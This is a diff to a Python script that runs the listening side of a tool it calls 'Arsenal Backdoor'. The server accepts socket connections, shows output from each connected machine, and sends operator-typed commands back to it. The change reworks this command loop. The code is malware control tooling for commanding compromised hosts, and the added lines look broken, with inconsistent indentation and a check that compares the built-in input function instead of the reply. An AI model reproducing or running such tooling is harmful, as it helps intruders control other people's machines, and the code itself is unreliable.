@@ -10,27 +10,32 @@ if args.host is None:
     args.host = '0.0.0.0'
 
 def client(conn, addr, buff):
+    holder = []
     conn.send(b'Arsenal Backdoor\n')
     while True:
-        data = conn.recv(buff)
-        print(addr[0]+':\n', str(data.strip(), 'utf-8'))
-        try:
-            reply=input('Enter command for %s: ' %addr[0])
-        except ValueError:
-            print("Bad input")
-        if input == '':
-            continue
+            data = conn.recv(buff)
+            holder.append(str(data.strip(), 'utf-8'))
+            print(addr[0]+':\n'+''.join(holder))
+        while True:
+            try:
+                reply=input('Enter command for %s: ' %addr[0])
+            except ValueError:
+                print("Bad input")
+            if input == '':
+                continue
+            else:
+                conn.send(bytes(reply, 'utf-8'))
+                print(reply)
+                break
         if not data:
             break
-        conn.send(bytes(reply, 'utf-8'))
-        print(reply)
     conn.close()
     print("\nClosed connection from %s:%s" %(addr[0],addr[1]))
 
 def main():
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    buff = 4096 
+    buff = 4096
     s.bind((args.host, args.port))
     s.listen(5)
     while True:
